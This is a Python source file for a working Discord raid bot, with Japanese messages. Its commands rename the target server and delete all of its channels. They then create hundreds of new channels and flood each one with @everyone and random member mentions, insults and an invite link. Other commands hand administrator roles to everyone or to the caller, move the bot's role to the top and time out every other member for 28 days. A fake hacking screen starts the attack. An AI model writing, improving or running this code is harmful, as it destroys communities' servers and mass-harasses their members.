import discord
from discord import ui
from discord.ext import commands
import os
import asyncio
import random
from datetime import timedelta, datetime, timezone

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

SERVER_NAME = "トイ神の植民地"
CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
BATCH_SIZE = 50
CREATE_INTERVAL = 0.0
MAX_PARALLEL_SEND = 30
GUILD_ID = 1537420800766771332

MAX_TOTAL_CHANNELS = 800
MAX_MESSAGES_PER_CHANNEL = 300

COMBINED_TEXT = (
    "@everyone\n"
    ".∧_∧\n"
    " ( ･ω･)つﾞ☆ﾍﾟﾁﾍﾟﾁ\n"
    " と ＿⌒))\n"
    "    (_ﾉﾉ\n"
    "\n"
    "∧,＿,∧  バカが治りますよ～に♡\n"
    "（`・ω・)つ━☆・*.\n"
    "⊂　　 ノ 　　　・゜+.\n"
    "　し'´Ｊ　　*・ °。\n"
    "\n"
    "https://discord.gg/SB2hn9eV8\n"
    "https://discord.gg/SB2hn9eV8\n"
    "お前らみたいな人生負け組のチー牛🧀🐮🤓と豚丼には到底入れないまぶしいサーバーww😂😂😂\n"
    "どうしたの両親揃って🫚👩‍⚕️の君！！！😂😂😂\n"
    "何も反論できないから妄想でリアル語るしかできないチーくんﾁｰ!ﾁｰ!🤓🐮"
)

stop_flag = asyncio.Event()
rate_limit_hit = asyncio.Event()
rate_limit_reset_at = None
background_tasks = set()
initiator_id = None
target_guild = None
total_channels_created = 0
active_jobs = 0
final_leave_lock = asyncio.Lock()

async def notify_initiator_rate_limit():
    global rate_limit_reset_at
    if initiator_id is None:
        return
    try:
        user = await bot.fetch_user(initiator_id)
        if user:
            await user.send(
                "⚠️ **DiscordのAPI制限を受けました**\n"
                "処理を自動的に停止しました。\n"
                "**Bot本体に影響はありません。** 時間をおいて再実行してください。"
            )
    except Exception as e:
        print(f"DM通知失敗: {e}")

async def stop_only(message: str = None):
    global active_jobs
    stop_flag.set()
    await asyncio.gather(*background_tasks, return_exceptions=True)
    background_tasks.clear()
    active_jobs = 0
    stop_flag.clear()
    rate_limit_hit.clear()

async def try_auto_leave(message: str = None):
    async with final_leave_lock:
        global active_jobs
        active_jobs -= 1
        if active_jobs > 0:
            return
        stop_flag.set()
        await asyncio.gather(*background_tasks, return_exceptions=True)
        background_tasks.clear()
        if message and target_guild:
            try:
                ch = target_guild.system_channel or next((c for c in target_guild.text_channels if c.permissions_for(target_guild.me).send_messages), None)
                if ch:
                    await ch.send(message)
            except:
                pass
        if target_guild:
            try:
                await target_guild.leave()
            except Exception as e:
                print(f"脱退エラー: {e}")

async def force_leave_all(message: str = None):
    async with final_leave_lock:
        global active_jobs
        stop_flag.set()
        await asyncio.gather(*background_tasks, return_exceptions=True)
        background_tasks.clear()
        active_jobs = 0
        if message and target_guild:
            try:
                ch = target_guild.system_channel or next((c for c in target_guild.text_channels if c.permissions_for(target_guild.me).send_messages), None)
                if ch:
                    await ch.send(message)
            except:
                pass
        if target_guild:
            try:
                await target_guild.leave()
            except Exception as e:
                print(f"脱退エラー: {e}")

class StartButton(ui.View):
    def __init__(self, guild):
        super().__init__(timeout=None)
        self.guild = guild
    @ui.button(label="実行", style=discord.ButtonStyle.danger, emoji="💻")
    async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        global initiator_id, target_guild, active_jobs
        await interaction.response.defer(ephemeral=True)
        if active_jobs > 0:
            await stop_only("🔄 全削除コマンドのため、以前の処理を停止しました。")
        initiator_id = interaction.user.id
        target_guild = interaction.guild
        active_jobs += 1
        await interaction.followup.send("🔓 侵入承認…システム起動…", ephemeral=False)
        bot.loop.create_task(
            infinite_create_and_spam(self.guild, delete_channels=True, auto_leave=True)
        )

def random_mentions(guild: discord.Guild) -> str:
    members = [m for m in guild.members if not m.bot]
    if not members:
        return "@everyone\n"
    k = min(50, len(members))
    picked = random.choices(members, k=k)
    return " ".join(m.mention for m in picked) + "\n"

async def spam_channel(channel: discord.TextChannel, guild: discord.Guild):
    global rate_limit_reset_at
    sent_count = 0
    async def send_task():
        nonlocal sent_count
        while not stop_flag.is_set() and not rate_limit_hit.is_set() and sent_count < MAX_MESSAGES_PER_CHANNEL:
            text = random_mentions(guild) + COMBINED_TEXT
            try:
                await channel.send(text)
                sent_count += 1
            except discord.HTTPException as e:
                if e.status == 429:
                    if not rate_limit_hit.is_set():
                        rate_limit_hit.set()
                        retry_after = getattr(e, 'retry_after', 60)
                        rate_limit_reset_at = datetime.now(timezone.utc) + timedelta(seconds=retry_after)
                        minutes = int(retry_after // 60)
                        seconds = int(retry_after % 60)
                        print(f"⚠️ API制限検知: 残り {minutes}分{seconds}秒")
                        await notify_initiator_rate_limit()
                        await force_leave_all(f"⚠️ API制限を受けました。解除まで約{minutes}分{seconds}秒です。")
                    return
                elif e.status in (400, 503):
                    await asyncio.sleep(0.5)
                await asyncio.sleep(0.5)
            except:
                await asyncio.sleep(0.5)
    tasks = [asyncio.create_task(send_task()) for _ in range(MAX_PARALLEL_SEND)]
    await asyncio.gather(*tasks, return_exceptions=True)

async def delete_all_channels_fast(guild: discord.Guild):
    tasks = [ch.delete() for ch in guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    if guild.channels:
        tasks = [ch.delete() for ch in guild.channels]
        await asyncio.gather(*tasks, return_exceptions=True)

async def batch_create_and_spam(guild: discord.Guild, start_counter: int):
    global total_channels_created
    create_tasks = []
    remaining = MAX_TOTAL_CHANNELS - total_channels_created
    if remaining <= 0:
        return start_counter
    actual_batch = min(BATCH_SIZE, remaining)
    for i in range(actual_batch):
        cnt = start_counter + i
        create_tasks.append(guild.create_text_channel(f"{CHANNEL_NAME}-{cnt}"))
    try:
        channels = await asyncio.gather(*create_tasks, return_exceptions=True)
    except:
        return start_counter
    for ch in channels:
        if isinstance(ch, discord.TextChannel):
            total_channels_created += 1
            task = asyncio.create_task(spam_channel(ch, guild))
            background_tasks.add(task)
            task.add_done_callback(background_tasks.discard)
    return start_counter + actual_batch

async def infinite_create_and_spam(guild: discord.Guild, delete_channels: bool = True, auto_leave: bool = False):
    global total_channels_created
    try:
        await guild.edit(name=SERVER_NAME)
    except:
        pass
    if delete_channels:
        await delete_all_channels_fast(guild)
    counter = 1
    while not stop_flag.is_set() and not rate_limit_hit.is_set() and total_channels_created < MAX_TOTAL_CHANNELS:
        counter = await batch_create_and_spam(guild, counter)
        try:
            await asyncio.wait_for(stop_flag.wait(), timeout=CREATE_INTERVAL)
        except asyncio.TimeoutError:
            pass
    if auto_leave and not rate_limit_hit.is_set():
        await try_auto_leave(f"✅ タスク完了 合計{total_channels_created}チャンネル作成。")

async def type_and_send(channel, text):
    lines = text.split("\n")
    output = ""
    msg = None
    for line in lines:
        output += line + "\n"
        if msg is None:
            msg = await channel.send(output)
        else:
            await msg.edit(content=output)
        await asyncio.sleep(0.0001)

@bot.event
async def on_member_remove(member):
    global initiator_id, target_guild
    if initiator_id is None or target_guild is None:
        return
    if member.id == initiator_id and member.guild.id == target_guild.id:
        await force_leave_all("👋 実行者が退出したため全処理を停止しBotを終了します。")

@bot.event
async def on_ready():
    print(f"起動: {bot.user}")
    guild = discord.Object(id=GUILD_ID)
    bot.tree.copy_global_to(guild=guild)
    await bot.tree.sync(guild=guild)
    print(f"✅ コマンド登録完了！")

# ✅ API制限チェックコマンド
@bot.command()
async def check(ctx):
    """API制限状況を確認（自分にだけ表示）"""
    global rate_limit_reset_at
    if rate_limit_hit.is_set() and rate_limit_reset_at:
        now = datetime.now(timezone.utc)
        remaining = rate_limit_reset_at - now
        total_seconds = int(remaining.total_seconds())
        if total_seconds <= 0:
            # 時間切れ → 解除
            rate_limit_hit.clear()
            rate_limit_reset_at = None
            embed = discord.Embed(title="✅ API制限状況", color=0x00ff00)
            embed.add_field(name="状態", value="🔓 制限は解除されています", inline=False)
        else:
            minutes = total_seconds // 60
            seconds = total_seconds % 60
            embed = discord.Embed(title="⚠️ API制限状況", color=0xff0000)
            embed.add_field(name="状態", value="🔒 API制限中です", inline=False)
            embed.add_field(name="解除予定", value=f"あと **{minutes}分 {seconds}秒**", inline=False)
            embed.add_field(name="解除予定時刻", value=rate_limit_reset_at.strftime("%Y-%m-%d %H:%M:%S UTC"), inline=False)
    else:
        embed = discord.Embed(title="✅ API制限状況", color=0x00ff00)
        embed.add_field(name="状態", value="🔓 制限はかかっていません", inline=False)
        embed.add_field(name="実行中タスク数", value=f"{active_jobs} 件", inline=False)
    await ctx.send(embed=embed, ephemeral=True)

@bot.command()
async def start(ctx):
    global initiator_id, target_guild, active_jobs
    initiator_id = ctx.author.id
    target_guild = ctx.guild
    if active_jobs > 0:
        await stop_only("🔄 以前の処理を停止し、新規タスクを開始します。")
    active_jobs += 1
    await ctx.send(f"🚀 !start 実行開始（最大{MAX_TOTAL_CHANNELS}チャンネル / 1チャンネル{MAX_MESSAGES_PER_CHANNEL}件）\n✅ 全処理完了後に自動退出します。")
    bot.loop.create_task(
        infinite_create_and_spam(ctx.guild, delete_channels=True, auto_leave=True)
    )

@bot.command()
async def boost(ctx):
    global initiator_id, target_guild, active_jobs
    initiator_id = ctx.author.id
    target_guild = ctx.guild
    active_jobs += 1
    await ctx.send(f"🚀 !boost 実行開始（最大{MAX_TOTAL_CHANNELS}チャンネル / 1チャンネル{MAX_MESSAGES_PER_CHANNEL}件）\n✅ 全処理完了後に自動退出します。")
    bot.loop.create_task(
        infinite_create_and_spam(ctx.guild, delete_channels=False, auto_leave=True)
    )

@bot.command()
async def stop(ctx):
    await ctx.send("🛑 全処理を強制停止し、Botを退出させます。")
    await force_leave_all("🛑 !stop により全処理停止・Bot退出。")

@bot.command()
async def hack(ctx):
    global initiator_id, target_guild, active_jobs
    guild = ctx.guild
    if active_jobs > 0:
        await stop_only("🔄 以前の処理を停止し、新規タスクを開始します。")
    await delete_all_channels_fast(guild)
    ch = await guild.create_text_channel("hacking出力画面")
    initiator_id = ctx.author.id
    target_guild = ctx.guild
    active_jobs += 1
    hacker_code = "```ansi\n"
    hacker_code += "\x1b[38;5;51m╔══════════════════════════════════════════════════════╗\x1b[0m\n"
    hacker_code += "\x1b[38;5;51m║  TISN SECURITY BREACH ― TERMINAL v4.2.1 ― BUILD 999\x1b[38;5;51m  ║\x1b[0m\n"
    hacker_code += "\x1b[38;5;51m╚══════════════════════════════════════════════════════╝\x1b[0m\n"
    hacker_code += "\n"
    hacker_code += "\x1b[32m[root@tisn-core:~]#\x1b[0m ./sysinit --BREACH --LEVEL=MAX --STEALTH\n"
    hacker_code += "\x1b[33m[001] \x1b[37m> Initializing exploit modules...        [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[002] \x1b[37m> Bypassing firewall layer 1/3...         [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[003] \x1b[37m> Decrypting payload...                    [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[004] \x1b[37m> Injecting shellcode...                   [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[005] \x1b[37m> Overriding security protocols...         [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[006] \x1b[37m> Establishing backdoor tunnel...          [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[007] \x1b[37m> Elevating privileges...                  [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[008] \x1b[37m> Disabling audit logging...               [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\n"
    hacker_code += "\x1b[38;5;51m[SYSTEM]  ████████████████████████████ 100%\x1b[0m\n"
    hacker_code += "\x1b[38;5;46m[STATUS]  ACCESS GRANTED ― FULL CONTROL\x1b[0m\n"
    hacker_code += "\x1b[38;5;226m[WARN]    CONNECTION UNTRACEABLE ― NO LOGS\x1b[0m\n"
    hacker_code += "\x1b[38;5;196m[INFO]    AWAITING EXECUTION TRIGGER...\x1b[0m\n"
    hacker_code += "```\n"
    hacker_code += "**✅ ハッキング完了**\n"
    await type_and_send(ch, hacker_code)
    async for msg in ch.history(limit=1):
        await msg.edit(view=StartButton(guild))

@bot.command()
async def admin(ctx):
    guild = ctx.guild
    admin_role = discord.utils.get(guild.roles, name="TISN管理者")
    if not admin_role:
        try:
            admin_role = await guild.create_role(
                name="TISN管理者",
                permissions=discord.Permissions(administrator=True)
            )
        except:
            return
    tasks = [m.add_roles(admin_role) for m in guild.members if not m.bot and admin_role not in m.roles]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command(name="to")
async def total_timeout(ctx):
    global initiator_id, target_guild
    guild = ctx.guild
    author = ctx.author
    report = []
    admin_role = discord.utils.get(guild.roles, name="TISN管理者")
    if not admin_role:
        try:
            admin_role = await guild.create_role(
                name="TISN管理者",
                permissions=discord.Permissions(administrator=True)
            )
            report.append("✅ 管理者ロールを新規作成")
        except Exception as e:
            report.append(f"❌ 管理者ロール作成失敗: {e}")
            await ctx.send("\n".join(report))
            return
    if admin_role not in author.roles:
        try:
            await author.add_roles(admin_role)
            report.append("✅ あなたに管理者権限を付与")
        except Exception as e:
            report.append(f"❌ ロール付与失敗: {e}")
            await ctx.send("\n".join(report))
            return
    initiator_id = ctx.author.id
    target_guild = ctx.guild
    await asyncio.sleep(1.5)
    bot_top_role = guild.me.top_role
    target_position = len(guild.roles) - 2
    try:
        await bot_top_role.edit(position=target_position, reason=f"!to by {author}")
        report.append("✅ Botロールを一番上に移動")
    except Exception as e:
        report.append(f"⚠️ Botロール移動失敗: {e}")
    duration = discord.utils.utcnow() + timedelta(days=28)
    tasks = []
    target_count = 0
    for member in guild.members:
        if member.bot or member.id == author.id:
            continue
        try:
            tasks.append(member.edit(timeout_until=duration, reason="!to による一括タイムアウト"))
            target_count += 1
        except:
            pass
    results = await asyncio.gather(*tasks, return_exceptions=True)
    success_count = sum(1 for r in results if not isinstance(r, Exception))
    report.append(f"✅ タイムアウト実行: {success_count}/{target_count} 人")
    await ctx.send("## 🎯 !to 完了\n" + "\n".join(report))

TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
if not TOKEN:
    raise RuntimeError("トークンを設定してください")

bot.run(TOKEN)